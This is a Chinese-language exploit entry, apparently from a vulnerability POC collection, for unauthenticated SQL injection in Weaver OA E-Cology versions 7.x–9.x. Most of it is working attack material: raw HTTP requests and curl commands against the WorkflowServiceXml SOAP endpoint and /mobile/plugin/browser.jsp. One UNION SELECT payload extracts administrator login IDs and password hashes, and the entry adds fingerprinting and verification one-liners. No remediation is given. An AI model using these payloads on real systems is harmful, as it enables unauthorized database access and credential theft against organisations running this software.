---
id: WEAVER-ECOLOGY-SQLI
title: 泛微OA E-Cology WorkflowServiceXml SQL注入漏洞
product: weaver-oa
vendor: 泛微网络
version_affected: "E-Cology 9.x, 8.x, 7.x"
severity: HIGH
tags: [sqli, 无需认证, 国产, oa]
fingerprint: ["泛微", "weaver", "ecology", "/services/", "WorkflowServiceXml"]
---

## 漏洞描述

泛微OA E-Cology 多个接口存在SQL注入漏洞，包括WorkflowServiceXml、LoginService等SOAP接口。

## 影响版本

- 泛微OA E-Cology 9.x
- 泛微OA E-Cology 8.x
- 泛微OA E-Cology 7.x

## 前置条件

- 目标运行泛微OA E-Cology 且可通过网络访问
- SOAP 服务接口（`/services/`）或移动端接口（`/mobile/`）未做访问限制
- 无需认证

## 利用步骤

### WorkflowServiceXml SQL注入

```http
POST /services/WorkflowServiceXml HTTP/1.1
Host: target
Content-Type: text/xml
SOAPAction: ""

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
   <soapenv:Body>
      <web:doCreateWorkflowRequest>
         <web:string><![CDATA[<xml><mainData><row><col column="requestname"><value>test' AND 1=CONVERT(int,(SELECT @@version))--</value></col></row></mainData></xml>]]></web:string>
         <web:string>1</web:string>
      </web:doCreateWorkflowRequest>
   </soapenv:Body>
</soapenv:Envelope>
```

### Login.jsp SQL注入

```http
POST /mobile/plugin/browser.jsp HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

isDis=1&browserTypeId=269&keyword=1%27%20union%20select%201,2,3,loginid,password,6,7,8,9,10,11,12,13,14%20from%20HrmResourceManager--
```

## Payload

### WorkflowServiceXml SOAP 注入

```bash
curl -X POST "http://target/services/WorkflowServiceXml" \
  -H "Content-Type: text/xml" \
  -H 'SOAPAction: ""' \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn"><soapenv:Body><web:doCreateWorkflowRequest><web:string><![CDATA[<xml><mainData><row><col column="requestname"><value>test'\'' AND 1=CONVERT(int,(SELECT @@version))--</value></col></row></mainData></xml>]]></web:string><web:string>1</web:string></web:doCreateWorkflowRequest></soapenv:Body></soapenv:Envelope>'
```

### browser.jsp 注入提取管理员凭据

```bash
curl -X POST "http://target/mobile/plugin/browser.jsp" \
  -d "isDis=1&browserTypeId=269&keyword=1%27%20union%20select%201,2,3,loginid,password,6,7,8,9,10,11,12,13,14%20from%20HrmResourceManager--"
```

## 验证方法

- SOAP 注入：响应中包含 SQL Server 版本信息（如 `Microsoft SQL Server`）或 SQL 报错信息即确认
- browser.jsp 注入：响应中返回管理员 `loginid` 和 `password` 哈希值即确认

```bash
curl -s -X POST "http://target/mobile/plugin/browser.jsp" \
  -d "isDis=1&browserTypeId=269&keyword=1%27%20union%20select%201,2,3,loginid,password,6,7,8,9,10,11,12,13,14%20from%20HrmResourceManager--" | grep -i "admin"
```

## 指纹确认

```bash
curl -s http://target/services/ | grep -i "workflow\|weaver"
```
